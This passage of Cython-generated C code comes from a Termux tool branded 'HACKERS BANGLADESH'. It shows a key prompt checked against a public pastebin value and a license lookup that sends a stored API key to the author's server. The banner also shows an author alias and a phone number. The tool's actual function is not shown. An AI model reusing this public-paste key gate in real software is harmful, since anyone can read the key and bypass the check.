  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__request__", 0);

  /* "libme.pyx":75
 * 
 * 	def __request__(self):
 * 		os.system("clear")             # <<<<<<<<<<<<<<
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		xx = requests.get('https://pastebin.com/raw/2ivpYP20')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":76
 * 	def __request__(self):
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")             # <<<<<<<<<<<<<<
 * 		xx = requests.get('https://pastebin.com/raw/2ivpYP20')
 * 		lulu = xx.text
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_1_92m_____1_92m_1_92m) < 0) __PYX_ERR(0, 76, __pyx_L1_error)

  /* "libme.pyx":77
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		xx = requests.get('https://pastebin.com/raw/2ivpYP20')             # <<<<<<<<<<<<<<
 * 		lulu = xx.text
 * 		print ("")
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_requests); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_kp_s_https_pastebin_com_raw_2ivpYP20) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_s_https_pastebin_com_raw_2ivpYP20);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_xx = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":78
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		xx = requests.get('https://pastebin.com/raw/2ivpYP20')
 * 		lulu = xx.text             # <<<<<<<<<<<<<<
 * 		print ("")
 * 		hulu = input("\033[0;92m[+] Enter Key : ")
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_xx, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_lulu = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":79
 * 		xx = requests.get('https://pastebin.com/raw/2ivpYP20')
 * 		lulu = xx.text
 * 		print ("")             # <<<<<<<<<<<<<<
 * 		hulu = input("\033[0;92m[+] Enter Key : ")
 * 		if lulu == hulu:
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_) < 0) __PYX_ERR(0, 79, __pyx_L1_error)

  /* "libme.pyx":80
 * 		lulu = xx.text
 * 		print ("")
 * 		hulu = input("\033[0;92m[+] Enter Key : ")             # <<<<<<<<<<<<<<
 * 		if lulu == hulu:
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_hulu = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":81
 * 		print ("")
 * 		hulu = input("\033[0;92m[+] Enter Key : ")
 * 		if lulu == hulu:             # <<<<<<<<<<<<<<
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')
 * 			pass
 */
  __pyx_t_1 = PyObject_RichCompare(__pyx_v_lulu, __pyx_v_hulu, Py_EQ); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 81, __pyx_L1_error)
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_4) {

    /* "libme.pyx":82
 * 		hulu = input("\033[0;92m[+] Enter Key : ")
 * 		if lulu == hulu:
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')             # <<<<<<<<<<<<<<
 * 			pass
 * 			self.__start__()
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_0_32m_Login_Successfully) < 0) __PYX_ERR(0, 82, __pyx_L1_error)

    /* "libme.pyx":84
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')
 * 			pass
 * 			self.__start__()             # <<<<<<<<<<<<<<
 * 		else:
 * 			print( "  Wrong Key Bro... \n")
 */
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_start); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":81
 * 		print ("")
 * 		hulu = input("\033[0;92m[+] Enter Key : ")
 * 		if lulu == hulu:             # <<<<<<<<<<<<<<
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')
 * 			pass
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":86
 * 			self.__start__()
 * 		else:
 * 			print( "  Wrong Key Bro... \n")             # <<<<<<<<<<<<<<
 * 			print( "  Talk To Admin For Key...\n")
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 */
  /*else*/ {
    if (__Pyx_PrintOne(0, __pyx_kp_s_Wrong_Key_Bro) < 0) __PYX_ERR(0, 86, __pyx_L1_error)

    /* "libme.pyx":87
 * 		else:
 * 			print( "  Wrong Key Bro... \n")
 * 			print( "  Talk To Admin For Key...\n")             # <<<<<<<<<<<<<<
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_Talk_To_Admin_For_Key) < 0) __PYX_ERR(0, 87, __pyx_L1_error)

    /* "libme.pyx":88
 * 			print( "  Wrong Key Bro... \n")
 * 			print( "  Talk To Admin For Key...\n")
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')             # <<<<<<<<<<<<<<
 * 	def __start__(self):
 * 		os.system("clear")
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_kp_s_xdg_open_https_youtube_com_chann) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_xdg_open_https_youtube_com_chann);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_L3:;

  /* "libme.pyx":74
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 * 	def __request__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("libme.James.__request__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_xx);
  __Pyx_XDECREF(__pyx_v_lulu);
  __Pyx_XDECREF(__pyx_v_hulu);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":89
 * 			print( "  Talk To Admin For Key...\n")
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		try:
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_5__start__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_5__start__ = {"__start__", (PyCFunction)__pyx_pw_5libme_5James_5__start__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_5__start__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__start__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_4__start__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_4__start__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_key = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v_status = NULL;
  PyObject *__pyx_v_expired = NULL;
  PyObject *__pyx_v_choose = NULL;
  PyObject *__pyx_v_apikey = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__start__", 0);

  /* "libme.pyx":90
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):
 * 		os.system("clear")             # <<<<<<<<<<<<<<
 * 		try:
 * 			key = open(".__apikey__.log","r").read()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":91
 * 	def __start__(self):
 * 		os.system("clear")
 * 		try:             # <<<<<<<<<<<<<<
 * 			key = open(".__apikey__.log","r").read()
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "libme.pyx":92
 * 		os.system("clear")
 * 		try:
 * 			key = open(".__apikey__.log","r").read()             # <<<<<<<<<<<<<<
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 * 			status = a["member"]
 */
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 92, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 92, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 92, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_v_key = __pyx_t_1;
      __pyx_t_1 = 0;

      /* "libme.pyx":93
 * 		try:
 * 			key = open(".__apikey__.log","r").read()
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()             # <<<<<<<<<<<<<<
 * 			status = a["member"]
 * 			expired = a["expired"]
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_requests); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = PyNumber_Add(__pyx_kp_s_https_james_anggakurniawan_my_id, __pyx_v_key); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_3);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_json); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_a = __pyx_t_1;
      __pyx_t_1 = 0;

      /* "libme.pyx":94
 * 			key = open(".__apikey__.log","r").read()
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 * 			status = a["member"]             # <<<<<<<<<<<<<<
 * 			expired = a["expired"]
 * 		except KeyError:
 */
      __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_member); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_v_status = __pyx_t_1;
      __pyx_t_1 = 0;

      /* "libme.pyx":95
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 * 			status = a["member"]
 * 			expired = a["expired"]             # <<<<<<<<<<<<<<
 * 		except KeyError:
 * 			status = "Trial"
 */
      __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_expired); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_v_expired = __pyx_t_1;
      __pyx_t_1 = 0;

      /* "libme.pyx":91
 * 	def __start__(self):
 * 		os.system("clear")
 * 		try:             # <<<<<<<<<<<<<<
 * 			key = open(".__apikey__.log","r").read()
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 */
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":96
 * 			status = a["member"]
 * 			expired = a["expired"]
 * 		except KeyError:             # <<<<<<<<<<<<<<
 * 			status = "Trial"
 * 			expired = "you are not registered"
 */
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError);
    if (__pyx_t_9) {
      __Pyx_AddTraceback("libme.James.__start__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_7, &__pyx_t_2) < 0) __PYX_ERR(0, 96, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_2);

      /* "libme.pyx":97
 * 			expired = a["expired"]
 * 		except KeyError:
 * 			status = "Trial"             # <<<<<<<<<<<<<<
 * 			expired = "you are not registered"
 * 		if "Premium" in status:
 */
      __Pyx_INCREF(__pyx_n_s_Trial);
      __Pyx_XDECREF_SET(__pyx_v_status, __pyx_n_s_Trial);

      /* "libme.pyx":98
 * 		except KeyError:
 * 			status = "Trial"
 * 			expired = "you are not registered"             # <<<<<<<<<<<<<<
 * 		if "Premium" in status:
